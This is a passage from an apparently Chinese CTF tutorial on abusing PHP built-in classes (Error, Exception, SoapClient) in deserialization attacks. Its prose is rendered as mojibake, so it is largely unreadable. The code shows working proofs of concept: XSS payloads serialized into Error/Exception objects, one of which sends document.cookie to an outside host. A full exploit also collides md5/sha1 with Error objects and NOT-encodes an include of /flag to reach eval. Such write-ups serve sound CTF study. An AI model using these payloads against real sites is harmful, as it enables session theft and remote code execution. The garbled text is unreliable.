</div><p>ï¼ˆè¿™é‡Œå¯ä»¥çœ‹åˆ°æ˜¯ä¸€ä¸ªååºåˆ—åŒ–å‡½æ•°ï¼Œä½†æ˜¯æ²¡æœ‰è®©æˆ‘ä»¬è¿›è¡Œååºåˆ—åŒ–çš„ç±»å•Šï¼Œè¿™å°±é‡åˆ°äº†ä¸€ä¸ªååºåˆ—åŒ–ä½†æ²¡æœ‰POPé“¾çš„æƒ…å†µï¼Œæ‰€ä»¥åªèƒ½æ‰¾åˆ°PHPå†…ç½®ç±»æ¥è¿›è¡Œååºåˆ—åŒ–ï¼‰</p>
<p>POC:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Error</span><span class="p">(</span><span class="s2">&#34;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$b</span> <span class="o">=</span> <span class="nx">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>  
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20250315173457748.png"
	width="1615"
	height="855"
	srcset="/p/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20250315173457748_hu1419547418116235339.png 480w, /p/php%E5%8E%9F%E7%94%9F%E7%B1%BB%E5%88%A9%E7%94%A8/image-20250315173457748_hu9996366573769383693.png 1024w"
	loading="lazy"
	
		alt="image-20250315173457748"
	
	
		class="gallery-image" 
		data-flex-grow="188"
		data-flex-basis="453px"
	
></p>
<p>æˆåŠŸå¼¹çª—</p>
<h3 id="exceptionå†…ç½®ç±»">Exceptionå†…ç½®ç±»
</h3><ul>
<li>é€‚ç”¨äºphp5ã€7ç‰ˆæœ¬</li>
<li>å¼€å¯æŠ¥é”™çš„æƒ…å†µä¸‹</li>
</ul>
<p>æµ‹è¯•ä»£ç è·Ÿå‰é¢ä¸€æ ·</p>
<p>POCæŠŠErroræ”¹æˆExceptionå°±è¡Œäº†</p>
<h3 id="ä¾‹é¢˜bjdctf-2ndxssä¹‹å…‰">ä¾‹é¢˜ï¼š[BJDCTF 2nd]xssä¹‹å…‰
</h3><p>ä¸Šæ¥gitæ³„éœ²</p>
<p>githackæ‹¿åˆ°æºç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;yds_is_so_beautiful&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä»…çœ‹åˆ°ä¸€ä¸ªååºåˆ—åŒ–å‡½æ•°å¹¶æ²¡æœ‰ç»™å‡ºéœ€è¦ååºåˆ—åŒ–çš„ç±»ï¼Œè¿™å°±é‡åˆ°äº†ä¸€ä¸ªååºåˆ—åŒ–ä½†æ²¡æœ‰POPé“¾çš„æƒ…å†µï¼Œæ‰€ä»¥åªèƒ½æ‰¾åˆ°PHPå†…ç½®ç±»æ¥è¿›è¡Œååºåˆ—åŒ–ã€‚åˆå‘ç°æœ‰ä¸ªechoï¼Œæ²¡å¾—è·‘äº†ï¼Œå°±æ˜¯æˆ‘ä»¬åˆšæ‰æ¼”ç¤ºçš„åˆ©ç”¨Erroræˆ–Exceptionå†…ç½®ç±»è¿›è¡ŒXSSï¼Œä½†æ˜¯æŸ¥çœ‹ä¸€ä¸‹é¢˜ç›®çš„ç¯å¢ƒå‘ç°æ˜¯PHP 5ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ä½¿ç”¨Exceptionç±»ã€‚</p>
<p>ç”±äºæ­¤é¢˜æ˜¯xssï¼Œæ‰€ä»¥åªè¦xssæ‰§è¡Œwindow.open()å°±èƒ½æŠŠflagå¸¦å‡ºæ¥ï¼Œæ‰€ä»¥POCå¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$poc</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Exception</span><span class="p">(</span><span class="s2">&#34;&lt;script&gt;window.open(&#39;http://c58a1663-14ce-4f57-b10a-2d43f95f5747.node5.buuoj.cn:81/?&#39;+document.cookie);&lt;/script&gt;&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$poc</span><span class="p">));</span>
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ç„¶åæŸ¥çœ‹cookieå°±è¡Œäº†</p>
<h2 id="ä½¿ç”¨-errorexception-å†…ç½®ç±»ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ">ä½¿ç”¨ Error/Exception å†…ç½®ç±»ç»•è¿‡å“ˆå¸Œæ¯”è¾ƒ
</h2><p>åœ¨ä¸Šæ–‡ä¸­ï¼Œæˆ‘ä»¬å·²ç»è®¤è¯†äº†Errorå’ŒExceptionè¿™ä¸¤ä¸ªPHPå†…ç½®ç±»ï¼Œä½†å¯¹ä»–ä»¬å¦™ç”¨ä¸ä»…é™äº XSSï¼Œè¿˜å¯ä»¥é€šè¿‡å·§å¦™çš„æ„é€ ç»•è¿‡md5()å‡½æ•°å’Œsha1()å‡½æ•°çš„æ¯”è¾ƒã€‚è¿™é‡Œæˆ‘ä»¬å°±è¦è¯¦ç»†çš„è¯´ä¸€ä¸‹è¿™ä¸ªä¸¤ä¸ªé”™è¯¯ç±»äº†ã€‚</p>
<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œåœ¨Errorå’ŒExceptionè¿™ä¸¤ä¸ªPHPåŸç”Ÿç±»ä¸­å†…åªæœ‰ <code>__toString</code> æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•ç”¨äºå°†å¼‚å¸¸æˆ–é”™è¯¯å¯¹è±¡è½¬æ¢ä¸ºå­—ç¬¦ä¸²ã€‚</p>
<p>æˆ‘ä»¬ä»¥Errorä¸ºä¾‹ï¼Œæˆ‘ä»¬çœ‹çœ‹å½“è§¦å‘ä»–çš„ <code>__toString</code> æ–¹æ³•æ—¶ä¼šå‘ç”Ÿä»€ä¹ˆï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Error</span><span class="p">(</span><span class="s2">&#34;payload&#34;</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$a</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1">//è¾“å‡ºå¦‚ä¸‹ï¼šError: payload in /usercode/file.php:2
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">Stack</span> <span class="nx">trace</span><span class="o">:</span>
</span></span><span class="line"><span class="cl"><span class="c1">#0 {main}
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>å‘ç°è¿™å°†ä¼šä»¥å­—ç¬¦ä¸²çš„å½¢å¼è¾“å‡ºå½“å‰æŠ¥é”™ï¼ŒåŒ…å«å½“å‰çš„é”™è¯¯ä¿¡æ¯ï¼ˆ&ldquo;payload&rdquo;ï¼‰ä»¥åŠå½“å‰æŠ¥é”™çš„è¡Œå·ï¼ˆ&ldquo;2&rdquo;ï¼‰ï¼Œè€Œä¼ å…¥ <code>Error(&quot;payload&quot;,1)</code> ä¸­çš„é”™è¯¯ä»£ç â€œ1â€åˆ™æ²¡æœ‰è¾“å‡ºå‡ºæ¥ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Error</span><span class="p">(</span><span class="s2">&#34;payload&#34;</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span><span class="nv">$b</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Error</span><span class="p">(</span><span class="s2">&#34;payload&#34;</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$a</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;</span><span class="se">\r\n\r\n</span><span class="s2">&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="c1">//è¾“å‡ºï¼š
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">Error</span><span class="o">:</span> <span class="nx">payload</span> <span class="nx">in</span> <span class="o">/</span><span class="nx">usercode</span><span class="o">/</span><span class="nx">file</span><span class="o">.</span><span class="nx">php</span><span class="o">:</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl"><span class="nx">Stack</span> <span class="nx">trace</span><span class="o">:</span>
</span></span><span class="line"><span class="cl"><span class="c1">#0 {main}
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl"><span class="nx">Error</span><span class="o">:</span> <span class="nx">payload</span> <span class="nx">in</span> <span class="o">/</span><span class="nx">usercode</span><span class="o">/</span><span class="nx">file</span><span class="o">.</span><span class="nx">php</span><span class="o">:</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl"><span class="nx">Stack</span> <span class="nx">trace</span><span class="o">:</span>
</span></span><span class="line"><span class="cl"><span class="c1">#0 {main}
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>å¯è§ï¼Œ<code>$a</code> å’Œ <code>$b</code> è¿™ä¸¤ä¸ªé”™è¯¯å¯¹è±¡æœ¬èº«æ˜¯ä¸åŒçš„ï¼Œä½†æ˜¯ <code>__toString</code> æ–¹æ³•è¿”å›çš„ç»“æœæ˜¯ç›¸åŒçš„ã€‚æ³¨æ„ï¼Œè¿™é‡Œä¹‹æ‰€ä»¥éœ€è¦åœ¨åŒä¸€è¡Œæ˜¯å› ä¸º <code>__toString</code> è¿”å›çš„æ•°æ®åŒ…å«å½“å‰è¡Œå·ã€‚</p>
<p>Exception ç±»ä¸ Error çš„ä½¿ç”¨å’Œç»“æœå®Œå…¨ä¸€æ ·ï¼Œåªä¸è¿‡ <code>Exception</code> ç±»é€‚ç”¨äºPHP 5å’Œ7ï¼Œè€Œ <code>Error</code> åªé€‚ç”¨äº PHP 7ã€‚</p>
<p>Errorå’ŒExceptionç±»çš„è¿™ä¸€ç‚¹åœ¨ç»•è¿‡åœ¨PHPç±»ä¸­çš„å“ˆå¸Œæ¯”è¾ƒæ—¶å¾ˆæœ‰ç”¨ï¼Œå…·ä½“è¯·çœ‹ä¸‹é¢è¿™é“ä¾‹é¢˜ã€‚</p>
<h3 id="ä¾‹é¢˜2020-æå®¢å¤§æŒ‘æˆ˜greatphp">ä¾‹é¢˜ï¼š[2020 æå®¢å¤§æŒ‘æˆ˜]Greatphp
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">SYCLOVER</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$syc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$lover</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">syc</span> <span class="o">!=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lover</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">syc</span><span class="p">)</span> <span class="o">===</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lover</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">sha1</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">syc</span><span class="p">)</span><span class="o">===</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lover</span><span class="p">))</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">           <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\&lt;\?php|\(|\)|</span><span class="se">\&#34;</span><span class="s2">|\&#39;/&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">syc</span><span class="p">,</span> <span class="nv">$match</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">               <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">syc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">           <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">               <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Try Hard !!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">           <span class="p">}</span>
</span></span><span class="line"><span class="cl">           
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;great&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="nx">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;great&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>å¯è§ï¼Œéœ€è¦è¿›å…¥eval()æ‰§è¡Œä»£ç éœ€è¦å…ˆé€šè¿‡ä¸Šé¢çš„ifè¯­å¥ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">syc</span> <span class="o">!=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lover</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">syc</span><span class="p">)</span> <span class="o">===</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lover</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">sha1</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">syc</span><span class="p">)</span><span class="o">===</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lover</span><span class="p">))</span> <span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™ä¸ªä¹çœ‹ä¸€çœ¼åœ¨ctfçš„åŸºç¡€é¢˜ç›®ä¸­éå¸¸å¸¸è§ï¼Œä¸€èˆ¬æƒ…å†µä¸‹åªéœ€è¦ä½¿ç”¨æ•°ç»„å³å¯ç»•è¿‡ã€‚ä½†æ˜¯è¿™é‡Œæ˜¯åœ¨ç±»é‡Œé¢ï¼Œæˆ‘ä»¬å½“ç„¶ä¸èƒ½è¿™ä¹ˆåšã€‚</p>
<p>è¿™é‡Œçš„è€ƒç‚¹æ˜¯md5()å’Œsha1()å¯ä»¥å¯¹ä¸€ä¸ªç±»è¿›è¡Œhashï¼Œå¹¶ä¸”ä¼šè§¦å‘è¿™ä¸ªç±»çš„ <code>__toString</code> æ–¹æ³•ï¼›ä¸”å½“eval()å‡½æ•°ä¼ å…¥ä¸€ä¸ªç±»å¯¹è±¡æ—¶ï¼Œä¹Ÿä¼šè§¦å‘è¿™ä¸ªç±»é‡Œçš„ <code>__toString</code> æ–¹æ³•</p>
<p>æ ¹æ®åˆšæ‰è®²çš„Errorç±»å’ŒExceptionç±»ä¸­ <code>__toString</code> æ–¹æ³•çš„ç‰¹æ€§ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸¤ä¸ªå†…ç½®ç±»è¿›è¡Œç»•è¿‡ã€‚</p>
<p>ç”±äºé¢˜ç›®ç”¨preg_matchè¿‡æ»¤äº†å°æ‹¬å·æ— æ³•è°ƒç”¨å‡½æ•°ï¼Œæ‰€ä»¥æˆ‘ä»¬å°è¯•ç›´æ¥ <code>include &quot;/flag&quot;</code> å°†flagåŒ…å«è¿›æ¥å³å¯ã€‚ç”±äºè¿‡æ»¤äº†å¼•å·ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨urlå–åç»•è¿‡å³å¯ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">SYCLOVER</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$syc</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="nv">$lover</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span> <span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">syc</span> <span class="o">!=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lover</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">syc</span><span class="p">)</span> <span class="o">===</span> <span class="nx">md5</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lover</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nx">sha1</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">syc</span><span class="p">)</span><span class="o">===</span> <span class="nx">sha1</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">lover</span><span class="p">))</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">           <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s2">&#34;/\&lt;\?php|\(|\)|</span><span class="se">\&#34;</span><span class="s2">|\&#39;/&#34;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">syc</span><span class="p">,</span> <span class="nv">$match</span><span class="p">)){</span>
</span></span><span class="line"><span class="cl">               <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">syc</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">           <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">               <span class="k">die</span><span class="p">(</span><span class="s2">&#34;Try Hard !!&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">           <span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$str</span> <span class="o">=</span> <span class="s2">&#34;?&gt;&lt;?=include~&#34;</span><span class="o">.</span><span class="nx">urldecode</span><span class="p">(</span><span class="s2">&#34;%D0%99%93%9E%98&#34;</span><span class="p">)</span><span class="o">.</span><span class="s2">&#34;?&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="cm">/* 
</span></span></span><span class="line"><span class="cl"><span class="cm">æˆ–ä½¿ç”¨[~(å–å)][!%FF]çš„å½¢å¼ï¼Œ
</span></span></span><span class="line"><span class="cl"><span class="cm">å³: $str = &#34;?&gt;&lt;?=include[~&#34;.urldecode(&#34;%D0%99%93%9E%98&#34;).&#34;][!.urldecode(&#34;%FF&#34;).&#34;]?&gt;&#34;;    
</span></span></span><span class="line"><span class="cl"><span class="cm">
</span></span></span><span class="line"><span class="cl"><span class="cm">$str = &#34;?&gt;&lt;?=include $_GET[_]?&gt;&#34;; 
</span></span></span><span class="line"><span class="cl"><span class="cm">*/</span>
</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="k">new</span> <span class="nx">Error</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span><span class="nv">$b</span><span class="o">=</span><span class="k">new</span> <span class="nx">Error</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span><span class="mi">2</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$c</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SYCLOVER</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nv">$c</span><span class="o">-&gt;</span><span class="na">syc</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$c</span><span class="o">-&gt;</span><span class="na">lover</span> <span class="o">=</span> <span class="nv">$b</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span><span class="p">(</span><span class="nx">urlencode</span><span class="p">(</span><span class="nx">serialize</span><span class="p">(</span><span class="nv">$c</span><span class="p">)));</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œ <code>$str = &quot;?&gt;&quot;;</code> ä¸­ä¸ºä»€ä¹ˆè¦åœ¨å‰é¢åŠ ä¸Šä¸€ä¸ª <code>?&gt;</code> å‘¢ï¼Ÿå› ä¸º <code>Exception</code> ç±»ä¸ <code>Error</code> çš„ <code>__toString</code> æ–¹æ³•åœ¨eval()å‡½æ•°ä¸­è¾“å‡ºçš„ç»“æœæ˜¯ä¸å¯èƒ½æ§çš„ï¼Œå³è¾“å‡ºçš„æŠ¥é”™ä¿¡æ¯ä¸­ï¼Œpayloadå‰é¢è¿˜æœ‰ä¸€æ®µæ‚ä¹±ä¿¡æ¯â€œError: â€ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">Error</span><span class="o">:</span> <span class="nx">payload</span> <span class="nx">in</span> <span class="o">/</span><span class="nx">usercode</span><span class="o">/</span><span class="nx">file</span><span class="o">.</span><span class="nx">php</span><span class="o">:</span><span class="mi">2</span>
</span></span><span class="line"><span class="cl"><span class="nx">Stack</span> <span class="nx">trace</span><span class="o">:</span>
</span></span><span class="line"><span class="cl"><span class="c1">#0 {main}
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>è¿›å…¥eval()å‡½æ•°ä¼šç±»ä¼¼äºï¼š<code>eval(&quot;...Error: &lt;?php payload ?&gt;&quot;)</code>ã€‚æ‰€ä»¥æˆ‘ä»¬è¦ç”¨ <code>?&gt;</code> æ¥é—­åˆä¸€ä¸‹ï¼Œå³ <code>eval(&quot;...Error: ?&gt;&lt;?php payload ?&gt;&quot;)</code>ï¼Œè¿™æ ·æˆ‘ä»¬çš„payloadä¾¿èƒ½é¡ºåˆ©æ‰§è¡Œäº†ã€‚</p>
<h2 id="ä½¿ç”¨-soapclient-ç±»è¿›è¡Œ-ssrf">ä½¿ç”¨ SoapClient ç±»è¿›è¡Œ SSRF
</h2><h3 id="soapclient-ç±»">SoapClient ç±»
</h3><p><strong>è¿™ä¸ªè¦åœ¨æœ¬åœ°çš„php.inié‡Œé¢æŠŠsoapæ‹“å±•å¯åŠ¨</strong></p>
<p>PHP çš„å†…ç½®ç±» SoapClient æ˜¯ä¸€ä¸ªä¸“é—¨ç”¨æ¥è®¿é—®webæœåŠ¡çš„ç±»ï¼Œå¯ä»¥æä¾›ä¸€ä¸ªåŸºäºSOAPåè®®è®¿é—®WebæœåŠ¡çš„ PHP å®¢æˆ·ç«¯ã€‚</p>
